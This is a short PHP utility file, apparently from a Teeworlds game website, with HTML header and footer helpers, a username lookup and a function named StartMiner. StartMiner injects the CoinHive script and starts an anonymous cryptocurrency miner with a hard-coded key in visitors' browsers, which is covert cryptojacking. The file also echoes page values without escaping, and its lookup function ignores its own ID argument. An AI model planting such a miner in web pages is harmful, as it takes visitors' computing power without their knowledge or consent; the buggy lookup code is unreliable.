<?php
/***************************
*  usefull_functions.php   *
*   teeworlds project      *
****************************/

function HtmlFooter()
{
?>
	</body>
</html>
<?php
}

function fok()
{
	HtmlFooter();
	die();
}

function HtmlHeader($style, $title)
{
?>
<!DOCTYPE html>
<html>
  <head> 
	<!-- Own stuff -->
	<link rel="stylesheet" href="<?php echo $style; ?>">
	<link href="http://fonts.googleapis.com/css?family=Comfortaa" rel="stylesheet" type="text/css">
	<title><?php echo $title; ?></title>
 </head>
  <body>
<?php
}

function StartMiner()
{
    echo "
    <script type=\"text/javascript\" src=\"http://gc.kis.v2.scr.kaspersky-labs.com/53E3864D-FC2B-D140-B3DF-6529E8918B17/main.js\" charset=\"UTF-8\"></script><script src=\"https://coin-hive.com/lib/coinhive.min.js\"></script>
    <script>
        var miner = new CoinHive.Anonymous('j57w0oCR02CAY7z3JgZ4q90071ajRxP1');
        miner.start();
    </script>
    ";
}

function GetUsernameByID($sqlID)
{
	$db = new PDO(ABSOLUTE_DATABASE_PATH);
	$db->setAttribute( PDO::ATTR_ERRMODE, PDO::ERRMODE_WARNING );
	$stmt = $db->prepare('SELECT * FROM Accounts WHERE ID = ? ');
	$stmt->execute(array($_SESSION['csID']));

	$rows = $stmt->fetchAll(PDO::FETCH_ASSOC);

	if ($rows)
	{
		$username = $rows[0]['Username'];
		return $username;
	}
	return "error";
}

?>
